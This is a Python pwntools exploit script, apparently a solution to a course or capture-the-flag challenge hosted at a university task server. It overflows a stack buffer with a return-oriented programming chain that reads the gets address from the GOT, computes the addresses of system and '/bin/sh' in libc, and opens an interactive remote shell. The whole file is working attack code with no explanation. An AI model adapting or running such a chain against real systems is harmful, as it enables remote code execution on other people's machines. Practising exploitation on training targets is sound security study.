#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 33262)
#conn = pwn.remote('127.0.0.1', 1024)

# use the provided lib c
#conn = pwn.process('./vuln')
#pwn.gdb.attach(conn)

# fixed as no ASLR in binray (got offset via IDA)
adress_got_gets = 0x000000000041BFB8

libz = pwn.ELF('./vuln')

# use my libc for local testing, switch to provided one for server
#libc = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = pwn.ELF('./libc.so.6')

offset_gets = libc.symbols['gets']
offset_system = libc.symbols['system']

offset_shell_string = next(libc.search(b'/bin/sh\x00'))

# address_system = address_gets - offset_gets + offset_system
offset_to_system = offset_gets - offset_system
offset_to_shell_string = offset_shell_string - offset_gets

# address of gedgets
address_g01 = 0x0000000000403f62 # pop rdx; ret;
address_g02 = 0x000000000040d6c7 # lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret;
address_g03 = 0x0000000000403f62 # pop rdx; ret;
address_g04 = 0x000000000040a8ee # pop rax; ret;
address_g05 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret;
address_g06 = 0x0000000000403f62 # pop rdx; ret;
address_g07 = 0x0000000000404ed1 # add rax, rdx; ret;
address_g08 = 0x000000000040d2ab # push rax; mov edx, 0x1bf8; mov esi, 1; call rcx;
address_g09 = 0x00000000004129a3 # mov rdi, qword ptr [rsp + 8]; mov eax, dword ptr [rdi + 0x40]; add rsp, 0x18; ret; 
address_g10 = 0x0000000000403f62 # pop rdx; ret;
address_g11 = 0x000000000040a8ee # pop rax; ret;
address_g12 = 0x0000000000410c70 # mov rax, qword ptr [rdx + rax*8]; ret;
address_g13 = 0x0000000000403f62 # pop rdx; ret;
address_g14 = 0x0000000000411937 # sub rax, rdx; ret;
address_g15 = 0x0000000000401010 # call rax;

address_fil = 0x00000000004011df # nop; ret;

rop_chain = [
    b'A'*24,
    pwn.p64(address_g01),
    pwn.p64(address_g09 - 0x558),
    pwn.p64(address_g02),
    pwn.p64(address_g03),
    pwn.p64(adress_got_gets),
    pwn.p64(address_g04),
    pwn.p64(0x0),
    pwn.p64(address_g05),
    pwn.p64(address_g06),
    pwn.p64(offset_to_shell_string),
    pwn.p64(address_g07),
    pwn.p64(address_g08),
    b'A'*8,
    pwn.p64(address_g10),
    pwn.p64(adress_got_gets),
    pwn.p64(address_g11),
    pwn.p64(0x0),
    pwn.p64(address_g12),
    pwn.p64(address_g13),
    pwn.p64(offset_to_system),
    pwn.p64(address_g14),

    pwn.p64(address_fil), # we need to pad sothat call is 16bit alligned

    pwn.p64(address_g15)
]

rop_chain = b''.join(gadget for gadget in rop_chain)

print(rop_chain.hex())

conn.sendline(rop_chain)
conn.interactive()

exit()